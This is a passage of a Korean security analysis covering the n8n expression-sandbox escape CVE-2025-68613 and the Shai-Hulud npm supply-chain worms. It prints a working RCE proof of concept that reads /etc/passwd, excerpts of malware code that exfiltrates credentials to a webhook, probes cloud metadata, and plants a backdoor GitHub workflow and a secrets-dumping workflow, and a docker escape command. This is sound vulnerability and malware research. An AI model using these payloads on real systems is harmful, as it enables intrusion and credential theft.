`sanitizer`는 sandbox 내에서 파싱된 코드를 대상으로 사용되며, 객체에서 메소드를 참조할 때, 참조하는 메소드 이름마다 `sanitizer` 인자로 들어가게 된다.

Prototype 메소드를 악용하여 Prototype Pollution 및 Sandbox Escaping을 방지하기 위한 여러 코드들이 존재하며, 각각 메소드 호출 방식이나 상황에 따라 다른 함수들이 호출된다. `sanitizer`는 `'prot'+'otype'` 와 같은 방식의 키워드 필터링 우회를 방어할 때 사용된다.

```jsx
(function anonymous(E) {
  var global = {};

  try {
    return "eedx"[this.__sanitize("proto" + "type")];
  } catch (e) {
    E(e, this);
  }
});
```

위 코드는 `{{ "eedx"['proto'+'type'] }}` 를 삽입하여 실행할 경우 Expression을 처리하기 위해 실행하는 sandboxing된 코드이다. prototype 키워드를 우회하기 위해서 `'proto'+'type'`형식으로 우회 하였으나, 앞서 설명하였던 `sanitizer` 함수의 인자로 삽입되어 필터링 되므로, Prototype 참조가 불가능해진다.

> parameterValue.match(constructorValidation);

해당 코드는 정규 표현식을 통해 constructor를 통한 Prototype Pollution 및 Sandbox Escaping을 방지하는 코드로 추측된다.

```jsx
const constructorValidation = new RegExp(/\.\s*constructor/gm);
if (parameterValue.match(constructorValidation)) {
  throw new ExpressionError(
    "Expression contains invalid constructor function call",
    {
      causeDetailed:
        "Constructor override attempt is not allowed due to security concerns",
      runIndex,
      itemIndex,
    },
  );
}
```

`constructor`를 사용하여 상위 객체 혹은 Function 객체에 접근하여 임의 코드를 실행할 수 있으며, 이를 막기 위해 constructor 사용을 막는 것으로 보여진다. `.constructor` 과 같은 방식의 참조를 방어하고 있으나, `["constructor"]` 형식의 참조는 막을 수 없다.

위 3개의 필터링 및 sandboxing 코드 외에 Prototype 참조 방어 로직, sandboxing 로직을 추가로 분석하였다.

> Sandboxing

n8n에서 sandboxing 후, Expression을 실행하는 코드는 다음과 같다.

```jsx
export class FunctionEvaluator implements ExpressionEvaluator {
	private _codeCache: Record<string, Function> = {};

	constructor(private instance: Tournament) {}

	private getFunction(expr: string): Function {
		if (expr in this._codeCache) {
			return this._codeCache[expr];
		}
		const [code] = this.instance.getExpressionCode(expr);
		const func = new Function('E', code + ';');
		this._codeCache[expr] = func;
		return func;
	}

	evaluate(expr: string, data: unknown): ReturnValue {
		const fn = this.getFunction(expr);
		return fn.call(data, this.instance.errorHandler);
	}
}
```

sandboxing을 위해 AST로 파싱 및 정제한 Expression 코드를 `Function` 함수와 함께 선언하여 Expression 코드가 삽입된 함수를 선언한다. 이후, 해당 함수를 받아 call을 통해 앞서 Sandbox Escaping을 방지하기 위해 분석했던 Sandbox Escaping 방지 처리 및 필터링 함수가 선언된 `data` 객체를 인자로 받아 호출된다.

`data` 객체는 함수의 `this`를 대체하게 되며, 객체에는 Express 실행에 필요한 함수가 포함되어 있다. `this`를 참조하지 않고, 전역 `eval`을 호출할 수 있으면, Sandbox Escaping 되어 `eval` 함수를 사용할 수 있겠지만, `eval`을 호출하는 페이로드를 삽입하면 다음과 같이 함수 내용이 정의 및 실행된다.

```jsx
// {{ eval(1) }}
(function anonymous(E) {
  var global = {};

  try {
    return ("eval" in this ? this : global).eval(1);
  } catch (e) {
    E(e, this);
  }
});
```

n8n 내부 Expression 파싱 로직에 의해 `eval` 함수를 전역에서 호출하는 것이 아닌 앞서 함수의 `this`를 대체 하도록 전달 받은 data 객체에서 참조한다. 자세한 Expression 파싱 방식에 대한 분석은 주제에 많이 벗어나므로 생략하지만, 위와 같은 Expression 파싱 및 코드 실행 방식으로 인해 `Expression.initializeGlobalContext`에서 빈 객체로 재정의한 함수들은 사용할 수 없다.

> Prototype 참조 방지

`sanitize` 함수 외에 Express 파싱이 완료된 후, Prototype을 참조하는 코드가 있는지 검사하는 로직이 존재한다. Sandbox Escaping 및 Prototype Pollution을 방지하기 위해 구성한 것으로 추측된다.

```jsx
// packages\workflow\src\expression-sandboxing.ts

...

const unsafeObjectProperties = new Set(['__proto__', 'prototype', 'constructor', 'getPrototypeOf']);

export function isSafeObjectProperty(property: string) {
	return !unsafeObjectProperties.has(property);
}

...

export const PrototypeSanitizer: ASTAfterHook = (ast, dataNode) => {
	astVisit(ast, {
		visitMemberExpression(path) {
			this.traverse(path);
			const node = path.node;
			if (!node.computed) {
				// This is static, so we're safe to error here
				if (node.property.type !== 'Identifier') {
					throw new ExpressionError(
						`Unknown property type ${node.property.type} while sanitising expression`,
					);
				}

				if (!isSafeObjectProperty(node.property.name)) {
					throw new ExpressionError(
						`Cannot access "${node.property.name}" due to security concerns`,
					);
				}
			} else if (node.property.type === 'StringLiteral' || node.property.type === 'Literal') {
				// Check any static strings against our forbidden list
				if (!isSafeObjectProperty(node.property.value as string)) {
					throw new ExpressionError(
						`Cannot access "${node.property.value as string}" due to security concerns`,
					);
				}
			} else if (!node.property.type.endsWith('Literal')) {
				// This isn't a literal value, so we need to wrap it
				path.replace(
					b.memberExpression(
						// eslint-disable-next-line @typescript-eslint/no-unsafe-argument, @typescript-eslint/no-explicit-any
						node.object as any,
						// eslint-disable-next-line @typescript-eslint/no-unsafe-argument
						b.callExpression(b.memberExpression(dataNode, sanitizerIdentifier), [
							// eslint-disable-next-line @typescript-eslint/no-explicit-any
							node.property as any,
						]),
						true,
					),
				);
			}
		},
	});
};
```

AST를 이용해서 prototype을 참조하려는 경우 보안상 문제로 에러를 반환한 후, Expression 실행을 하지 않도록 보호 조치를 하였다.

---

### PoC Code 분석

앞선 분석을 통해 Sandbox Escaping을 방지하고자 많은 필터링 및 방어 조치를 취했지만, 모두 우회가 되었고, 정작 많은 방어 코드에 비해 PoC 코드는 짧고 간단해보여 자칫 쉽게 발견된 취약점으로 보이기도 한다.

(필자도 처음엔 보호 기법 우회 없이 단순 코드 실행으로 생각했다.)

PoC 코드가 작동하는 이유는 뭘까? PoC 코드를 다시 확인해보자.

```jsx
// Linux
{
  {
    (function () {
      return this.process.mainModule
        .require("child_process")
        .execSync("cat /etc/passwd")
        .toString();
    })();
  }
}

// Windows
{
  {
    (function () {
      return this.process.mainModule
        .require("child_process")
        .execSync("dir")
        .toString();
    })();
  }
}
```

PoC 코드에선 전역 함수 및 객체 호출을 할 때, Expression에 직접 호출하지 않고, 익명 함수로 한 번 감싼 뒤, 해당 함수에서 `this` 객체를 통해 `process`를 호출하여 RCE 공격을 위한 라이브러리를 호출하고 있다.

```jsx
(function anonymous(E) {
  var global = {};
  var ___n8n_data = this;

  return [
    function (v) {
      try {
        v = (function () {
          return this.process.mainModule
            .require("child_process")
            .execSync("dir")
            .toString();
        })();
      } catch (e) {
        E(e, this);
      }

      return v || v === 0 || v === false ? v : "";
    }.call(this),
    " ",
  ].join("");
});
```

위 코드는 PoC 코드를 실행할 경우 Expression이 해석되어 sandbox에서 실행될 코드이다. 해당 scope에서 DEBUG CONSOLE을 통해 this 객체를 그냥 호출할 때와 익명 함수 안에서 호출할 때의 차이를 비교해보았다.

![sandbox 내,  this와 익명 함수의 this 차이](/[KR]%20Deep-research-of-2025-Security/image%2016.png)

sandbox 내, this와 익명 함수의 this 차이

위 결과에서 `this`을 호출하면 사전에 전달한 `data` 객체를 참조하지만, 익명 함수로 감싸서 호출할 땐 `global` 전역 객체를 참조하는 것을 확인할 수 있다. 이 결과를 통해 익명 함수 안에서 `this`를 호출할 경우 사전에 전달한 객체를 참조하지 않고, 전역 객체인 `global`을 호출하는 것을 알 수 있다. **이런 방식은 Node.js의 non-strict mode 상태에서 Sandbox Escaping 기법이다.**

> In non-strict mode, if a function isn’t called as a method of an object, `this` defaults to the Global Object (_which is `global` in Node.js_).
> [https://medium.com/@win3zz/rce-via-insecure-js-sandbox-bypass-a26ad6364112](https://medium.com/@win3zz/rce-via-insecure-js-sandbox-bypass-a26ad6364112)

### Experiments

연구를 진행하면서 개인적인 궁금증에 시도해봤던 내용들을 담아보았다.

```jsx
Experiments

#case 1 - 함수 정의 방식 변경에 따른 성공 여부

{{ (function RCE(){ return this.process.mainModule.require('child_process').execSync('dir').toString() })() }} // Success

{{ function rce(){ return this.process.mainModule.require('child_process').execSync('dir').toString() }; rce(); }} // Fail

#case 2 - strict 모드를 설정했을 경우 PoC 동작 여부

code = '\'use strict\'\n'+code // DEBUG CONSOLE에서 strict 모드 강제 설정

(function anonymous(E
) {
'use strict'
var global = {};
var ___n8n_data = this;

return [function(v) {
    try {
        v = (function(){ return this;})();
    } catch (e) {
        E(e, this);
    }

    ;
    return v || v === 0 || v === false ? v : "";
}.call(this), " "].join("");;
})
// return Nothing.
```

### Patch Diff

CVE-2025-68613가 패치된 1.122.0 버전에서는 다음과 같이 패치되었다.

> **Patch #1**

Prototype 참조를 방지하기 위한 금지 메소드 집합에 기존 키워드 외에 모듈 호출에 필요한 메소드를 추가하여 Sandbox Escaping으로 인한 전역 객체에서 참조를 통한 모듈 호출을 방어했다.

![Patch #1](/[KR]%20Deep-research-of-2025-Security/image%2017.png)

Patch #1

> Patch #2

Expression을 실행하기 전, Sanitizing을 하는 `FunctionThisSanitizer` 함수가 추가되었다. 해당 함수는 Node.js에서 Non-strict 모드에서 익명 함수와 사용자 정의 함수의 this가 전역 객체를 참조하여 Sandbox Escaping이 되는 것을 방지하기 위한 함수이다. AST를 통해 함수 호출로 식별될 경우 해당 함수를 `call`과 `bind` 메소드를 사용하여 호출되도록 replace하였다. call과 bind에는 함수 내에서 `this`를 호출할 경우 전역 객체가 아닌 `EMPTY_CONTEXT` 를 참조하도록 하여 방어하였다.

![Patch #2](/[KR]%20Deep-research-of-2025-Security/image%2018.png)

Patch #2

````jsx
const EMPTY_CONTEXT = b.objectExpression([
  b.property("init", b.identifier("process"), b.objectExpression([])),
]);

export const FunctionThisSanitizer: ASTBeforeHook = (ast, dataNode) => {
  astVisit(ast, {
    visitCallExpression(path) {
      const { node } = path;

      if (node.callee.type !== "FunctionExpression") {
        this.traverse(path);
        return;
      }

      const fnExpression = node.callee;

      /**
       * Called function expressions (IIFEs) - both anonymous and named:
       *
       * ```js
       * (function(x) { return x * 2; })(5)
       * (function factorial(n) { return n <= 1 ? 1 : n * factorial(n-1); })(5)
       *
       * // become
       *
       * (function(x) { return x * 2; }).call({ process: {} }, 5)
       * (function factorial(n) { return n <= 1 ? 1 : n * factorial(n-1); }).call({ process: {} }, 5)
       * ```
       */
      this.traverse(path); // depth first to transform inside out
      const callExpression = b.callExpression(
        b.memberExpression(fnExpression, b.identifier("call")),
        [EMPTY_CONTEXT, ...node.arguments]
      );
      path.replace(callExpression);
      return false;
    },

    visitFunctionExpression(path) {
      const { node } = path;

      /**
       * Callable function expressions (callbacks) - both anonymous and named:
       *
       * ```js
       * [1, 2, 3].map(function(n) { return n * 2; })
       * [1, 2, 3].map(function factorial(n) { return n <= 1 ? 1 : n * factorial(n-1); })
       *
       * // become
       *
       * [1, 2, 3].map((function(n) { return n * 2; }).bind({ process: {} }))
       * [1, 2, 3].map((function factorial(n) { return n <= 1 ? 1 : n * factorial(n-1); }).bind({ process: {} }))
       * ```
       */
      this.traverse(path);
      const boundFunction = b.callExpression(
        b.memberExpression(node, b.identifier("bind")),
        [EMPTY_CONTEXT]
      );
      path.replace(boundFunction);
      return false;
    },
  });
};
````

다음은 글 작성에 참조한 레퍼런스들이다.

### References

[https://docs.n8n.io/integrations/builtin/core-nodes/n8n-nodes-base.set/](https://docs.n8n.io/integrations/builtin/core-nodes/n8n-nodes-base.set/)

[https://www.resecurity.com/blog/article/cve-2025-68613-remote-code-execution-via-expression-injection-in-n8n-2](https://www.resecurity.com/blog/article/cve-2025-68613-remote-code-execution-via-expression-injection-in-n8n-2)

[https://nvd.nist.gov/vuln/detail/CVE-2025-68613](https://nvd.nist.gov/vuln/detail/CVE-2025-68613)

[https://medium.com/@RosanaFS/n8n-rce-cve-2025-68613-tryhackme-walkthrough-ba713f682e56](https://medium.com/@RosanaFS/n8n-rce-cve-2025-68613-tryhackme-walkthrough-ba713f682e56)

[https://www.npmjs.com/package/n8n?activeTab=versions](https://www.npmjs.com/package/n8n?activeTab=versions)

[https://github.com/n8n-io/n8n/security](https://github.com/n8n-io/n8n/security)

[https://github.com/n8n-io/n8n/commit/39a2d1d60edde89674ca96dcbb3eb076ffff6316#diff-554dea1038c7e933e0341aee1f74c697b843be1217e0060cf1a76cc9b5988d77](https://github.com/n8n-io/n8n/commit/39a2d1d60edde89674ca96dcbb3eb076ffff6316#diff-554dea1038c7e933e0341aee1f74c697b843be1217e0060cf1a76cc9b5988d77)

[https://leapcell.io/blog/ko/javascript-eoseuteu-saendeu-bakseuing-gip-ipunseok](https://leapcell.io/blog/ko/javascript-eoseuteu-saendeu-bakseuing-gip-ipunseok)

[https://velog.io/@indeeeah/Node.js-use-strict란-왜-쓰는거야](https://velog.io/@indeeeah/Node.js-use-strict%EB%9E%80-%EC%99%9C-%EC%93%B0%EB%8A%94%EA%B1%B0%EC%95%BC)

[https://medium.com/@win3zz/rce-via-insecure-js-sandbox-bypass-a26ad6364112](https://medium.com/@win3zz/rce-via-insecure-js-sandbox-bypass-a26ad6364112)

## What is Shai-Hulud

![출처 : [https://www.reddit.com/r/programming/comments/1nbv9w3/color_npm_package_compromised/](https://www.reddit.com/r/programming/comments/1nbv9w3/color_npm_package_compromised/)](/[KR]%20Deep-research-of-2025-Security/image%2019.png)

출처 : [https://www.reddit.com/r/programming/comments/1nbv9w3/color_npm_package_compromised/](https://www.reddit.com/r/programming/comments/1nbv9w3/color_npm_package_compromised/)

본 문단에서는 Shai-Hulud 공급망 공격에 대해 조사해보고, 대형 라이브러리들에 어떠한 영향을 미쳤는지 알아보고자 한다. 이미 많은 해외 연구자들에 의해 조사,분석 되었으며, 다양한 글을 참고하였다. 공격은 몇 차례 발생하였고, 2025년 9월에 발생한 최초의 공격을 Shai-Hulud Attack, 이후 추가로 발생한 공격을 Shai-Hulud 2.0 Attack이라고 호칭한다.

Shai-Hulud 공격은 Dune(영화)에서 sandworm을 연상시키는 이름의 `Shai-Hulud.yaml` 파일이 멀웨어의 Github 워크플로우에서 발견되어, Shai Hulud 공격이라고 불린다.

Shai-Hulud 이전에 몇 번의 npm 공급망 공격이 있었지만, 해당 공격이 특히 주목받는 이유는 소프트웨어 공급망 공격에서 기존 공격보다 더욱 공격적인 수위를 보여주며, 하나의 라이브러리가 감염되면 해당 라이브러리를 사용하는 또, 다른 라이브러리를 감염시키는 방식의 대규모 패키지 포이즈닝을 성공한 최초의 자가 확산 공격이기 때문이다. 따라서, 오픈소스의 신뢰성을 심각하게 저해하고, 많은 이들에게 오픈소스의 위험성에 대해 다시금 깨닫게 해준 사례임을 시사한다.

[https://socket.dev/blog/ongoing-supply-chain-attack-targets-crowdstrike-npm-packages](https://socket.dev/blog/tinycolor-supply-chain-attack-affects-40-packages) 에 의하면, 2025년 9월에 발생한 최초 공격은 오픈소스 CrowdStrike 패키지를 포함하여 약 **500개의 npm 패키지**가 영향을 받았다고 한다.

### Shai-Hulud 공격 방식 및 악성코드 분석

Shai-Hulud 공격에 영향을 받아 손상된 패키지는 다음과 같은 상태가 된다.

1. tarball 패키지를 추가로 설치한다.
2. `package.json`을 수정하여 postinstall 속성으로 악성 로컬 스크립트(`bundle.js`)를 실행한다.
3. tarball을 통해 archive를 재패킹하고 재게시하여 이후, 하위 사용자가 재패킹된 악성 패키지를 설치하도록 한다. (trojanization)

위 과정에서 가장 주요한 점은 `package.json`의 수정이다. `package.json`은 Node.js에서 외부 패키지를 관리할 때, npm이 참고하는 파일이다. `package.json`에는 프로젝트의 이름, 작성자, 설명 등 기본 정보와 설치되어야 할 패키지들이 정의되어 있다.

![package.json 예시](/[KR]%20Deep-research-of-2025-Security/image%2020.png)

package.json 예시

scripts 부분에는 npm을 통해 해당 프로젝트에서 명령을 받았을 때, 수행하는 명령을 정의할 수 있다. 위 이미지를 예시로 `npm test`를 해당 경로에서 실행하면 `echo Error: no test specified && exit 1` 명령어가 실행된다. scripts에는 사용자 정의 명령도 있지만, 특수하게 정의된 명령들이 있다. 그 중 공격에 사용된 명령은 `postinstall` 명령이다. 해당 명령은 패키지 설치 후, 자동으로 실행된다.

![실제 공격에 사용된 package.json 파일에 postinstall 명령](/[KR]%20Deep-research-of-2025-Security/image%2021.png)

실제 공격에 사용된 package.json 파일에 postinstall 명령

Shai-Hulud 공격에는 위와 같이 악성 스크립트인 `bundle.js`가 실행되도록 `package.json`이 수정되어 있었다. `bundle.js` 파일은 크레덴셜 스캐너인 TruffleHog를 다운로드하고 실행한 후, 호스트에 존재하는 토큰과 클라우드 자격 증명을 검색한다. 이 스크립트는 개발자 자격 증명과 CI 자격 증명을 검증하고 사용하며, 저장소 내부에 GitHub Action 워크플로우를 생성하고, Action 실행 결과를 고정된 webhook 주소로 유출하게 된다.

```jsx
// bundle.js

1. TruffleHog 스캐너 다운로드 및 실행
2. 호스트 자격 증명 검색
3. 검색된 자격 증명으로 GitHub Action 워크플로우 생성 및 실행
4. Action 결과 webhook 전송
```

`bundle.js` 파일은 컨트롤러 역할을 하는 대용량의 minified 버전의 파일이다. 파일에는 실행 환경을 탐지하여, 그에 맞는 TruffleHog 바이너리를 가져와 파일 시스템 및 저장소 전체에서 알려진 자격 증명 패턴을 검색한다.

```jsx
// De-minified transcription from bundle.js
const { execSync } = require("child_process");
const os = require("os");

function trufflehogUrl() {
  const plat = os.platform();
  if (plat === "win32")
    return "hxxps://github[.]com/trufflesecurity/trufflehog/releases/download/.../trufflehog_windows_x86_64.zip";
  if (plat === "linux")
    return "hxxps://github[.]com/trufflesecurity/trufflehog/releases/download/.../trufflehog_linux_x86_64.tar.gz";
  return "hxxps://github[.]com/trufflesecurity/trufflehog/releases/download/.../trufflehog_darwin_all.tar.gz";
}

function runScanner(binaryPath, targetDir) {
  // Executes downloaded scanner against local paths
  const cmd = `"${binaryPath}" filesystem "${targetDir}" --json`;
  const out = execSync(cmd, { stdio: "pipe" }).toString();
  return JSON.parse(out); // Parsed findings contain tokens and secrets
}
```

`bundle.js`에는 GitHub 개인 토큰이 식별된 경우, 이를 사용하여 `.github/workflow`에 GitHub Actions 워크플로우를 작성하고, 수집된 내용을 웹훅으로 유출한다.

```jsx
# Extracted from a literal script block inside bundle.js
FILE_NAME=".github/workflows/shai-hulud-workflow.yml"

# Minimal exfil step inside the generated workflow
# Note: defanged URL for safety
run: |
  CONTENTS="$(cat findings.json | base64 -w0)"
  curl -s -X POST -d "$CONTENTS" "hxxps://webhook[.]site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7"
```

스크립트가 자격 증명을 유출할 때, 서비스를 특정하여 동작한다. GITHUB_TOKEN, NPM_TOKEN, AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY 같은 환경 변수를 탐색한다. npm token을 식별한 경우 해당 토큰을 npm의 whoami endpoint를 통해 검증하고, 사용 가능할 경우 GitHub API와 상호작용한다. 또한, 클라우드 빌드 에이전트 내부에 짧은 기간의 자격 증명이 유출 가능한지 메타데이터 탐색도 시도한다.

```jsx
// Key network targets inside the bundle
const imdsV4 = "http://169[.]254[.]169[.]254"; // AWS instance metadata
const imdsV6 = "http://[fd00:ec2::254]"; // AWS metadata over IPv6
const gcpMeta = "http://metadata[.]google[.]internal"; // GCP metadata

// npm token verification
fetch("https://registry.npmjs.org/-/whoami", {
  headers: { Authorization: `Bearer ${process.env.NPM_TOKEN}` },
});

// GitHub API use if GITHUB_TOKEN is present
fetch("https://api.github.com/user", {
  headers: { Authorization: `token ${process.env.GITHUB_TOKEN}` },
});
```

여기까지가 Shai-Hulud의 공격 방식의 전개이다. Shai-Hulud 공격 악성 스크립트는 몇 차례 바뀌었으며, **Socket**에서는 7번 정도 변조된 악성 스크립트를 식별했다고 한다. 악성 스크립트는 각 버전마다 스크립트의 은닉성을 높이고 효율적인 방법을 시도하도록 변경되었다.

Shai-Hulud 공격은 단순히 자격 증명을 탈취하는 것을 넘어, 자격 증명이 탈취된 라이브러리를 변조, 재패키징 후, 배포하여 초기 침투로 끝나는 것이 아닌, 피해가 지속되도록 한다. webhook을 사용한 자격 증명 유출, 코드은닉, TruffleHog를 사용한 자격 증명 탐색 등의 행위를 미루어보아, 사전에 고도화된 계획적인 공격임을 알 수 있다.

이 공격으로 인해 많은 패키지가 특정 패키지로 인해 영향 받고, 그 패키지를 사용하는 사용자 또한 영향 받게 되었다. 하지만, Shai-Hulud는 여기서 끝나지 않고 2025년 11월 2차 공격인 Shai-Hulud 2.0 공격이 발생한다.

### Shai-Hulud 2.0, Second Attack Occurred

2차로 발생한 Shai-Hulud 2.0 공격은 25년 11월 24일 오전 3시 경(UTC) 악성 패키지 버전이 npm에 업로드된 최초의 증거가 발견되었고, 25일 오후 10시 45분 경(UTC) 두 번째 단계(자가복제)가 처음 관찰되었으며, 초기 피해자 한 명의 개인 저장소가 1단계에서 유출된 자격 증명을 사용하여 공개 되었다.

이후, 초기 공격으로 약 3,200개의 저장소가 영향 받았으며, 비공개였던 저장소도 공개로 바뀌거나, 저장소 설명을 통해 홍보하는 사례가 발생했다.

![출처 : [https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack](https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack)](/[KR]%20Deep-research-of-2025-Security/image%2022.png)

출처 : [https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack](https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack)

이번 공격에서는 이전과 다른 특징이 나타났다.

1. Lifecycle scripts 설치를 사용한 실행
2. 새로운 공격 파일 - `setup_bun.js` 와 `bun_environment.js`

**Wiz**와 **Aikido**는 감염된 npm 패키지가 2025년 11월 21부터 23일 사이에 업로드 되었음을 확인했다고 한다. 악성 패키지를 설치하게 되면, 기존 공격과 비슷하게 개발자 및 CI/CD 관련 비밀 정보를 유출하지만, 다른 점은 Shai-Hulud를 언급하는 설명이 포함된 GitHub 저장소로 유출한다.

이 변종은 사전 설치(preinstall) 단계에서만 실행되며, 다음 파일들을 생성한다.

- `cloud.json`
- `contents.json`
- `environment.json`
- `truffleSecrets.json`

이후, 추가로 GitHub 워크플로우 내부에 `discussion.yaml` 파일 생성을 시도한다.

공격자는 여러 워크플로우를 추가하며 공격을 진행했다.

**첫 번째 페이로드는 감염된 시스템에 대한 백도어 역할하는 워크플로우를 구축한다.**

- 페이로드는 감염된 머신을 “SHA1HULUD”라는 이름의 self-hosted runner로 등록한다.
- 이후, Injection 취약점이 존재하는 워크플로우인 `.github/workflows/discussion.yaml`을 추가하는데, 해당 워크플로우는 self-hosted runner에서만 실행되도록 되어있다.

이 행위를 통해 공격자는 이후 GitHub 저장소에서 Discussion을 열기만 해도, 감염된 머신에서 임의의 명령을 실행할 수 있게된다.

결과적으로 초기 침투 후, 추가 공격을 위해 원하는 명령을 실행하도록 유사 백도어 역할을 한 것으로 보인다.

```jsx
await this.octokit.request("PUT /repos/{owner}/{repo}/contents/{path}", {
           'owner': _0x349291,
           'repo': _0x2b1a39,
           'path': ".github/workflows/discussion.yaml",
           'message': "Add Discusion",
           'content': Buffer.from("\nname: Discussion Create\non:\n  discussion:\njobs:\n  process:\n    env:\n      RUNNER_TRACKING_ID: 0\n    runs-on: self-hosted\n    steps:\n      - uses: actions/checkout@v5\n      - name: Handle Discussion\n        run: echo ${{ github.event.discussion.body }}\n").toString("base64"),
           'branch': 'main'
         });

name: Discussion Create
on:
  discussion:
jobs:
  process:
    env:
      RUNNER_TRACKING_ID: 0
    runs-on: self-hosted
    steps:
      - uses: actions/checkout@v5
      - name: Handle Discussion
        run: echo ${{ github.event.discussion.body }}
```

**두 번째 페이로드는 GitHub에 정의된 Secret(자격 증명)을 유출 한다.**

- `.github/workflows/formatter_123456789.yml` 워크플로우는 `add-linter-workflow-{Date.now()}`라는 이름으로 새로 생성된 브랜치에 푸시된다.
- 이후 GitHub의 Secrets 섹션에 정의된 모든 시크릿을 나열, 수집한 뒤, 이를 아티팩트로 업로드한다. (이 정보는 `actionsSecrets.json` 이름의 파일에 기록된다.)
- 아티팩트에 업로드 한 뒤, 방금 생성된 아티팩트를 다운로드한다. 해당 파일은 정보를 유출하기 위한 과정의 일부로 감염된 머신에 다운로드된다.
- 마지막으로, 워크플로우와 새로 만든 브랜치를 삭제해 앞선 악성 행동들을 은폐한다.

```jsx
name: Code Formatter
on:
  push
jobs:
  lint:
    runs-on: ubuntu-latest
    env:
      DATA: ${{ toJSON(secrets)}}
    steps:
      - uses: actions/checkout@v5
      - name: Run Formatter
        run: |
          cat <<EOF > format.json
          $DATA
          EOF
      - uses: actions/upload-artifact@v5
        with:
          path: format.json
          name: formatting
```

악성 페이로드는 다양한 환경의 클라우드에서 능동적으로 동작하도록 작성 되었다.

- **다양한 플랫폼 지원** : AWS, Azure, Google Cloud Platform 환경에서 동작 가능하도록 작성 되었으며, 공식 SDK를 번들로 제공하여 호스트 도구와 독립적으로 작동 가능하다.
- **자격 증명 탈취** : 로컬 파일 및 환경 변수나 내부 클라우드 메타데이터 서비스(IMDS)에서 자격 증명을 수집하여 임시 세션 토큰을 탈취한다.
- **자격증명 유출** : 탈취한 세션을 사용하여 AWS Secrets Manager, Google Secret Manager, Azure Key Vault에서 비밀 정보를 유출한다.
- **권한 상승** : 권한 있는 역할을 탈취하고 IAM 정책을 조작하여 접근 권한을 유지하거나 권한 상승을 시도한다.

악성코드는 Docker 환경에서 Docker Escaping을 시도 하도록 작성 되어있다. 악성코드는 호스트의 루트 파일 시스템을 권한이 높은 컨테이너에 `/host` 로 마운트한 뒤, 악성 sudoers 파일을 복사한다. 그 결과, 침해된 사용자에게 비밀번호 없이 루트 권한을 사용할 수 있는 권한을 부여 받게된다.

```jsx
docker run --rm --privileged -v /:/host ubuntu bash -c "cp /host/tmp/runner /host/etc/sudoers.d/runner"
```

클라우드나 docker 환경 외에 CI 환경이나 개발자 컴퓨터를 감염시킬 때, 다른 방식으로 작동한다.

- 악성코드는 동기(synchronous)로 실행된다. 즉, 패키지 설정 과정은 악성 코드가 모든 작업을 끝낼 때까지 완료되지 않는다. 그로 인해 감염 과정 동안 러너(runner)가 계속 활성 상태로 유지되도록 보장한다.
- 악성코드는 백그라운드 프로세스로 스스로 실행되어 패키지 설치가 지나치게 오래되지 않아, 사용자의 의심을 피할 수 있게 된다.

악성코드는 몇 가지 환경 변수를 통해서 CI 환경임을 체크한다.

```jsx
process.env.BUILDKITE ||
  process.env.PROJECT_ID ||
  process.env.GITHUB_ACTIONS ||
  process.env.CODEBUILD_BUILD_NUMBER ||
  process.env.CIRCLE_SHA1;
```

악성코드는 백도어를 위한 `discussion.yaml` 워크플로우를 생성한다고 앞서 언급하였다. 해당 워크플로우는 감염된 머신에서 지속성을 유지하기 위한 메커니즘으로 보인다. Wiz에서는 해당 백도어가 실제 사용된 사례는 발견되지 않았다고 하였다. 다만, 테스트를 통해 기능이 정상적으로 동작함을 검증하는데는 성공했다.

해당 저장소에서 새 Discussion을 하나 열기만 해도 침해된 시스템에서 코드를 실행할 수 있었다. 따라서, 이 워크플로우를 사용하는 공개 저장소는, 해당 저장소와 연결된 감염 머신들에 대한 백도어로 악용될 가능성이 있다.

![Discussion 워크플로우 백도어 테스트 / 출처 - [https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack#payload-analysis-26](https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack#payload-analysis-26)](/[KR]%20Deep-research-of-2025-Security/image%2023.png)

Discussion 워크플로우 백도어 테스트 / 출처 - [https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack#payload-analysis-26](https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack#payload-analysis-26)

![백도어 아티팩트 스크린샷 / 출처 - [https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack#payload-analysis-26](https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack#payload-analysis-26)](/[KR]%20Deep-research-of-2025-Security/image%2024.png)

백도어 아티팩트 스크린샷 / 출처 - [https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack#payload-analysis-26](https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack#payload-analysis-26)

### Impact

Wiz Research는 이번 공격으로 인해 수백 개의 종속 패키지를 보유한 널리 사용되는 오픈 소스 패키지에 영향을 미친 것으로 나타났으며, 이로 인해 소프트웨어 공급망 전반에 걸친 잠재적 파급효과를 시사한다고 했다.

![Shai-Hulud 2.0 공격에 의해 손상된 패키지에 의존하는 패키지 수를 나타내는 그래프 / 출처 -  [https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack#payload-analysis-26](https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack#payload-analysis-26)](/[KR]%20Deep-research-of-2025-Security/image%2025.png)

Shai-Hulud 2.0 공격에 의해 손상된 패키지에 의존하는 패키지 수를 나타내는 그래프 / 출처 - [https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack#payload-analysis-26](https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack#payload-analysis-26)

800개의 영향을 받은 패키지 중, 직간접적으로 의존하는 패키지는 약 230개에 불과하며, 이 중 100개 이상의 패키지는 18개에 불과하다고 한다.

![영향 받은 패키지의 각 의존 수 / 출처 -  [https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack#payload-analysis-26](https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack#payload-analysis-26)](/[KR]%20Deep-research-of-2025-Security/image%2026.png)

